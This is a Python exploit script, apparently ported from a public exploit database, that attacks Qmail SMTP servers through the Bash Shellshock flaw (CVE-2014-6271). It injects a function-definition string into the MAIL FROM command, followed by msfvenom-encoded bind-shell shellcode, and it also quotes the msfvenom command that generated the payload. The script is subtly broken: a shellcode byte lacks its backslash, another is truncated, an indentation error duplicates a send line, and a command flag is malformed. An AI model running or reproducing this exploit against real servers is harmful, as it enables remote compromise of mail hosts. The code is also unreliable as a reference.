'''
Qmail SMTP - Bash Environment Variable Injection
CVE: 2014-6271
Exploit Ported by BhanuNamikaze
Original Exploit: https://www.exploit-db.com/exploits/42938 

#Payload Generated using 
msfvenom -p linux/x64/shell_bind_tcp LHOST=127.0.0.1 LPORT=443 -f py b '\x00\x0a\x0d' -e x86/shikata_ga_nai

'''

import socket

class Exploit:
    def __init__(self, info={}):
        # Update RHOST & MAILTO with your addresses 
        self.datastore = {
            'RHOST': '127.0.0.1',
            'RPORT': 25,
            'MAILTO': 'admin@domain.com'
        }
        self.datastore.update(info)

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.datastore['RHOST'], self.datastore['RPORT']))
        self.sock.recv(1024)

    def disconnect(self):
        if self.sock:
            self.sock.close()

    def smtp_send(self, data=None):
        self.sock.sendall((data + "\r\n").encode())
        return self.sock.recv(1024).decode()

    def exploit(self):
        to = self.datastore['MAILTO']
        self.connect()
        print("[+] Starting the Exploit")
        result = self.smtp_send("HELO localhost")
        if not result.startswith(('2', '3')):
            print("Connection error")
            return
            
        print('[+] Sending the payload...')
		
        payload = "mail from:<() { :; }; ".encode() + b"xda\xd5\xd9\x74\x24\xf4\xbd\x38\xb4\x6b\x6a\x58" + \
            b"\x31\xc9\xb1\x16\x31\x68\x19\x03\x68\x19\x83\xe8" + \
            b"\xfc\xda\x41\x01\x43\x42\x33\xbc\x91\x2d\x29\x40" + \
            b"\xc8\xde\xa8\x0a\x63\xb2\x75\x8e\xaf\x30\x7a\x8e" + \
            b"\x14\x7c\xf3\x76\x00\x6c\x59\x1d\xe4\xd4\x52\xe" + \
            b"\x6c\xd6\x34\xe9\x75\x5e\xf4\x03\x1f\x75\xae\xe4" + \
            b"\xe5\xc1\xd9\x91\xe6\x8f\xad\x9a\x27\x45\x0f\x3d" + \
            b"\xb7\x9c\x3a\x4b\xad\xa5\x9c\x2a\x7a\x62\x33\x2f" + \
            b"\x12\xfa\x63\xdc\x8c\x02\x2f\x6a\xc4\xe5\x9d\x3d" + \
            b"\x9e\x60\xc7\xcd\x1b"
                    result = self.smtp_send(payload.decode('latin-1'))

        result = self.smtp_send(payload.decode('latin-1'))

        if not result.startswith(('2', '3')):
            print("Connection error")
            return
        print("[*] Response for the Payload: ", result)
        print("[+] Sending RCPT TO", to)
        result = self.smtp_send("rcpt to:<{}>".format(to))
        print("[*] Response from RCPT",result)
        if not result.startswith(('2', '3')):
            print("Connection error")
            return
        result = self.smtp_send("data")
        if not result.startswith(('2', '3', '4')):
            print("Connection error")
            return
        print("[+] Sending the Data..")
        result = self.smtp_send("data\r\n\r\nfoo\r\n\r\n.\r\n")
        print("[*] Response from Data",result)
        if not result.startswith(('2', '3')):
            print("Connection error")
            return
        print("Exploit Completed, Closing")
        self.disconnect()

exploit = Exploit()
exploit.exploit()

